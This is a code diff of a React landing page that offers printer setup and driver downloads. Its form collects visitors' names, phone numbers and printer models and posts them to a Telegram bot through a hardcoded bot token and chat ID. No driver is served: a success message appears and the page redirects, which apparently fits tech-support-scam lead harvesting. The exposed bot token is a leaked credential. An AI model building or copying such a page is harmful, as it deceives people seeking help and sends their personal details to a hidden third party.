@@ -1,199 +1,196 @@
 import React, { useState } from "react";
-import { Settings, CheckCircle, X } from "lucide-react";
 import { useNavigate } from "react-router-dom";
-import image from "../images/2.png";
+import { Printer, Download, HelpCircle } from "lucide-react";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogClose,
+} from "@/components/ui/dialog";
+import { Alert, AlertDescription } from "@/components/ui/alert";
+import img from "../images/colorjet.png";
+import img2 from "../images/Screenshot 2025-01-29 173931.png";
+
 const Hero = () => {
-  const navigate = useNavigate();
-  const [showModal, setShowModal] = useState(false);
   const [formData, setFormData] = useState({
+    printerModel: "",
     name: "",
-    model: "",
     phone: "",
   });
+  const [loading, setLoading] = useState(false);
+  const [success, setSuccess] = useState(false);
+  const navigate = useNavigate();
+  const [isModalOpen, setIsModalOpen] = useState(false);
 
-  const TELEGRAM_BOT_TOKEN = "7575372348:AAEFfVtgEXvhQLyr7b4IhLGAQPjXl-0Kjjk";
-  const TELEGRAM_CHAT_ID = "1684000886";
-
-  const handleSubmit = async (e: React.SyntheticEvent) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
+    setLoading(true);
 
-    const message = `🖨️ **New Printer Setup Request** 🖨️
-    - **Name:** ${formData.name}
-    - **Printer Model:** ${formData.model}
-    - **Phone:** ${formData.phone}`;
+    const TELEGRAM_BOT_TOKEN = "7575372348:AAEFfVtgEXvhQLyr7b4IhLGAQPjXl-0Kjjk";
+    const TELEGRAM_CHAT_ID = "1684000886";
 
     try {
       const response = await fetch(
         `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
         {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {
+            "Content-Type": "application/json",
+          },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "Markdown",
+            text: `📃 New Download Request\n👤 Name: ${formData.name}\n📞 Phone: ${formData.phone}\n🖨️ Printer Model: ${formData.printerModel}`,
           }),
         }
       );
 
       if (response.ok) {
-        setShowModal(false);
-        setFormData({ name: "", model: "", phone: "" });
-        navigate("/download-page");
-      } else {
-        alert("Failed to send your request. Please try again later.");
+        setSuccess(true);
+        setTimeout(() => {
+          navigate("/download-page");
+        }, 2000);
       }
     } catch (error) {
-      console.error("Error:", error);
-      alert("An error occurred. Please try again later.");
+      console.error("Error sending data:", error);
     }
+    setLoading(false);
   };
 
   return (
-    <section className="bg-gradient-to-br from-slate-900 via-blue-950 to-slate-900 relative">
-      <div className="absolute inset-0 bg-grid-white/[0.05]"></div>
-
-      <style>
-        {`
-          @keyframes button-hover {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
-          }
-          .animated-button {
-            animation: button-hover 2s infinite ease-in-out;
-          }
-          .bg-grid-white {
-            background-image: linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px),
-            linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px);
-            background-size: 20px 20px;
-          }
-        `}
-      </style>
-
-      <div className="container mx-auto px-4 py-12 relative z-10 flex flex-col lg:flex-row items-center lg:items-start">
-        {/* Left Section */}
-        <div className="lg:w-1/2 max-w-3xl mx-auto space-y-6 text-center lg:text-left">
-          <div className="space-y-4">
-            <h1 className="text-4xl lg:text-5xl font-bold">
-              <span className="text-white drop-shadow-lg">Printer Setup</span>
-              <span className="block text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-300">
-                Made Simple
-              </span>
-            </h1>
-            <p className="text-2xl text-gray-300 font-medium leading-relaxed">
-              Easy setup for your printer in just a few steps
-            </p>
-          </div>
-
-          <div className="flex flex-wrap justify-center lg:justify-start gap-4">
-            {["Easy Setup", "24/7 Support", "Quick Install", "Free Help"].map(
-              (feature) => (
-                <div
-                  key={feature}
-                  className="flex items-center gap-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2 border border-white/20"
-                >
-                  <CheckCircle className="h-6 w-6 text-green-400" />
-                  <span className="text-white font-medium text-lg">
-                    {feature}
-                  </span>
-                </div>
-              )
-            )}
-          </div>
-
-          <div className="mt-6">
-            <button
-              onClick={() => setShowModal(true)}
-              className="animated-button bg-green-600 text-white text-2xl font-bold px-8 py-4 rounded-xl border-b-4 border-green-800 shadow-lg hover:bg-green-500"
-            >
-              <div className="flex items-center gap-3">
-                <Settings className="h-8 w-8" />
-                <span>Printer Setup & Download Drivers</span>
+    <div className="bg-white flex items-center justify-center ">
+      <div className="max-w-4xl w-full bg-white rounded-xl shadow-lg border border-gray-200">
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 p-6">
+          <div className="space-y-6">
+            <div className="text-center md:text-left">
+              <div className="flex items-center gap-3 mb-4">
+                <Printer className="h-12 w-12 text-red-600" />
+                <img src={img2} className="h-8" alt="Logo" />
               </div>
-            </button>
-          </div>
-        </div>
+              <h1 className="text-4xl font-bold text-gray-900 mb-4">
+                Driver Download
+              </h1>
+              <p className="text-xl text-gray-600 leading-relaxed">
+                Get the latest printer drivers and software for optimal performance. 
+                Quick setup process, guaranteed compatibility.
+              </p>
+            </div>
 
-        {/* Right Section - Image */}
-        <div className="lg:w-1/2 flex justify-center mt-8 lg:mt-0">
-          <img
-            src={image} // Replace with your image path
-            alt="Printer Setup"
-            className="w-full max-w-lg object-cover rounded-lg shadow-lg"
-          />
+            <button
+              onClick={() => setIsModalOpen(true)}
+              className="w-full bg-red-600 text-white py-5 px-8 rounded-xl text-2xl font-bold hover:bg-red-700 transition-all flex items-center justify-center gap-3 shadow-md hover:shadow-lg"
+            >
+              <Download className="h-7 w-7" />
+              Click here for printer setup
+            </button>
+
+            <div className="bg-gray-50 p-4 rounded-lg">
+              <p className="text-gray-600 text-lg">
+                ✓ Drivers
+                <br />
+                ✓ Secure Download
+                <br />
+                ✓ Windows 11/10/8/7 Compatible
+              </p>
+            </div>
+          </div>
+
+          <div className="flex items-center justify-center">
+            <img
+              src={img}
+              alt="Printer"
+              className="w-full rounded-lg shadow-lg"
+            />
+          </div>
         </div>
       </div>
 
-      {/* Modal Form */}
-      {showModal && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
-          <div className="bg-white rounded-2xl p-6 shadow-xl max-w-md w-full relative">
-            <button
-              onClick={() => setShowModal(false)}
-              className="absolute right-4 top-4 text-gray-500 hover:text-gray-700"
-            >
-              <X className="h-6 w-6" />
-            </button>
-            <h2 className="text-3xl font-bold text-gray-800 mb-6 text-center">
-              Download Printer Driver
-            </h2>
-            <form onSubmit={handleSubmit} className="space-y-4">
+      <Dialog open={isModalOpen} onOpenChange={() => {}}>
+        <DialogContent className="sm:max-w-xl p-8">
+          <DialogHeader>
+            <DialogTitle className="text-3xl font-bold text-center mb-6">
+              Complete Driver Setup
+            </DialogTitle>
+          </DialogHeader>
+          <DialogClose
+            className="absolute right-4 top-4 rounded-sm opacity-70 hover:opacity-100"
+            onClick={() => setIsModalOpen(false)}
+          >
+            <span className="text-2xl">×</span>
+          </DialogClose>
+
+          {success ? (
+            <div className="space-y-4">
+              <Alert className="bg-green-50 border-green-200 p-6">
+                <AlertDescription className="text-2xl text-green-800 text-center">
+                  Initializing Download...
+                </AlertDescription>
+              </Alert>
+            </div>
+          ) : (
+            <form onSubmit={handleSubmit} className="space-y-6">
               <div>
-                <label className="block text-lg font-semibold text-gray-700 mb-2">
-                  Name
+                <label className="block text-xl font-medium text-gray-900 mb-2">
+                  Select Your Printer Model
                 </label>
                 <input
                   type="text"
+                  required
+                  value={formData.printerModel}
+                  onChange={(e) =>
+                    setFormData({ ...formData, printerModel: e.target.value })
+                  }
+                  placeholder="Example: PIXMA TR8620"
+                  className="w-full px-4 py-3 text-xl border-2 border-gray-300 rounded-xl focus:ring-4 focus:ring-red-100 focus:border-red-500"
+                />
+              </div>
+
+              <div>
+                <label className="block text-xl font-medium text-gray-900 mb-2">
+                  Full Name
+                </label>
+                <input
+                  type="text"
+                  required
                   value={formData.name}
                   onChange={(e) =>
                     setFormData({ ...formData, name: e.target.value })
                   }
-                  required
-                  className="w-full px-4 py-3 text-lg rounded-lg border-2 border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
-                  placeholder="Full Name (e.g., John Doe)"
+                  className="w-full px-4 py-3 text-xl border-2 border-gray-300 rounded-xl focus:ring-4 focus:ring-red-100"
                 />
               </div>
+
               <div>
-                <label className="block text-lg font-semibold text-gray-700 mb-2">
-                  Printer Model
-                </label>
-                <input
-                  type="text"
-                  value={formData.model}
-                  onChange={(e) =>
-                    setFormData({ ...formData, model: e.target.value })
-                  }
-                  required
-                  className="w-full px-4 py-3 text-lg rounded-lg border-2 border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
-                  placeholder="Printer Model (e.g., LaserJet 1020)"
-                />
-              </div>
-              <div>
-                <label className="block text-lg font-semibold text-gray-700 mb-2">
-                  Phone Number
+                <label className="block text-xl font-medium text-gray-900 mb-2">
+                  Contact Number
                 </label>
                 <input
                   type="tel"
+                  required
                   value={formData.phone}
                   onChange={(e) =>
                     setFormData({ ...formData, phone: e.target.value })
                   }
-                  required
-                  className="w-full px-4 py-3 text-lg rounded-lg border-2 border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
-                  placeholder="Contact Number (e.g., +1 234 567 890)"
+                  className="w-full px-4 py-3 text-xl border-2 border-gray-300 rounded-xl focus:ring-4 focus:ring-red-100"
                 />
               </div>
+
               <button
                 type="submit"
-                className="w-full bg-blue-600 text-white text-xl font-bold px-6 py-4 rounded-lg shadow-lg hover:bg-blue-500 transition-colors"
+                disabled={loading}
+                className="w-full bg-red-600 text-white py-4 px-6 rounded-xl text-2xl font-bold hover:bg-red-700 transition-all disabled:bg-red-300 shadow-lg"
               >
-                Download Now
+                {loading ? "Processing..." : "Download Now"}
               </button>
+
+              <p className="text-center text-gray-500 text-sm">
+                By downloading, you agree to our terms of service
+              </p>
             </form>
-          </div>
-        </div>
-      )}
-    </section>
+          )}
+        </DialogContent>
+      </Dialog>
+    </div>
   );
 };
 
